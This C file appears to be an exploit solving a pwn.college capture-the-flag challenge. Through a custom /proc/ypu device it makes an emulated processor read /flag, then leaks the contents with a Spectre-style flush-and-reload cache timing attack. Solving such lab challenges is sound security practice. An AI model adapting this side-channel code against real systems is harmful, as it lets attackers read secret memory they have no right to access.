#include <fcntl.h>
#include <sched.h>
#include <semaphore.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <x86intrin.h>

#include "vm_instr.h"

#define PAGE_SIZE 0x1000
#define MEMLIM 0x80

#define ZERO_OUT 0x555059
#define FILENAME "/flag"
#define FLAG_PREFIX "pwn.college"
#define FLAGLEN 59
#define START 32
#define END 0x7f

#define THRESHOLD 200
#define TRAIN_FOR 7 // :)

struct instruction *output;

struct page_data {
  char data[PAGE_SIZE];
} *page_ptr = NULL;

static int dev_fd;

#define COMM                                                                   \
  do {                                                                         \
    ioctl(dev_fd, 0x539, 0);
/* */
#define COMM_END                                                               \
  memset((void *)page_ptr, 0, 0xff * 3);                                       \
  set_output_idx(0);                                                           \
  }                                                                            \
  while (0)                                                                    \
    ;

#define COMM_AND_END COMM COMM_END

#define for_each_char(var) for (int var = START; var < END; var++)

size_t measure(void *ptr) {
  //    printf("ptr: %p\n", ptr);
  register void *reg_ptr asm("rdi") = ptr;
  size_t start, end;

  start = __rdtsc();
  _mm_lfence();
  asm volatile("mov r8, qword ptr [%0]" : : "r"(reg_ptr) : "r8");
  _mm_lfence();
  end = __rdtsc();

  return end - start;
}

void *get_page_ptr(size_t idx) {
  return &page_ptr[idx];
  //    return &((uint32_t*) &page_ptr[idx])[idx * 0x800 + 1];
}

void flush_pages(int start, int end) {
  for (int i = start; i < end; i++)
    _mm_clflush(get_page_ptr(i));
}

void init_yan(void) {
  set_output_idx(0);
  ((uint32_t *)page_ptr)[0] = ZERO_OUT;
  ((uint32_t *)page_ptr)[1] = 0xff;
  COMM_AND_END;

  memset(page_ptr, 0, PAGE_SIZE);
}

void train_exec() {
  interpret_imm(A, 0);
  interpret_imm(B, 1); // val = 1
  interpret_stm(A, B); // *addr = val
}

int process_data(size_t hits[END]);

int main(int argc, char **argv) {
  char flag[FLAGLEN] = {0};
  size_t threshold = THRESHOLD;

  dev_fd = open("/proc/ypu", O_RDWR);
  if (dev_fd < 0) {
    perror("open");
    exit(1);
  }

  page_ptr = mmap(NULL, 0x100000, PROT_WRITE | PROT_READ,
                  MAP_SHARED | MAP_POPULATE, dev_fd, 0);
  if (page_ptr == MAP_FAILED) {
    perror("mmap");
    exit(1);
  }
  init_yan();

  output = (void *)page_ptr;

  // filename to mem
  for (int i = 0; i < sizeof FILENAME; i++) {
    interpret_imm(D, FILENAME[i]);
    interpret_stk(0, D);
  }

  // open filename
  interpret_imm(A, 1);
  interpret_imm(B, O_RDWR);
  interpret_imm(C, 0);
  interpret_sys(OPEN, D);

  // read from the open file to mem[MEMLIM]
  interpret_imm(A, 0);
  interpret_imm(B, MEMLIM);
  interpret_imm(C, FLAGLEN);
  interpret_sys(READ_MEM, D);

  interpret_imm(A, 1);
  interpret_sys(EXIT, 1);

  COMM;

  memset(output, 0, 0xff * 3);
  // exploit
AGAIN:
  for (int i = 0; i < FLAGLEN; i++) {
    size_t hits[END] = {0};
    for (int _ = 0; _ < 100; _++) {
      //            train_exec();
      interpret_imm(A, MEMLIM + i);
      //            interpret_sys(EXIT, 1);
      //            COMM;

      interpret_sys(EXEC | EXIT, D);
      flush_pages(START, END);
      COMM;

      for_each_char(j) {
        volatile int mix_j = ((j * j) * 2);
        mix_j = (mix_j / j) ^ 1;
        mix_j ^= 1;
        mix_j /= 2;

        size_t time = measure(get_page_ptr(mix_j));
        if (time <= threshold)
          hits[mix_j] += 1;
      }
    }

    flag[i] = process_data(hits);
    if (flag[i]) {
      printf("\n\n - %c with hits of %zu - \n\n", flag[i], hits[flag[i]]);
      if (i == sizeof FLAG_PREFIX - 2 &&
          memcmp(flag, FLAG_PREFIX, sizeof FLAG_PREFIX - 1)) {
        printf("problem!: %s\n", flag);
        getchar();
        goto AGAIN;
      }
    } else
      i--;
  }

  printf("flag: %s\n", flag);
}

int process_data(size_t hits[END]) {
  static size_t i;

  size_t max_hits = 0;
  int ch = 0;
  for_each_char(j) {
    size_t hit = hits[j];
    if (hit)
      printf("%2zu/%3d (%c) - hits: %ld\n", i, j, j, hit);
    if (hit && max_hits < hit) {
      max_hits = hit;
      ch = j;
    }
  }

  i++;
  return ch;
}
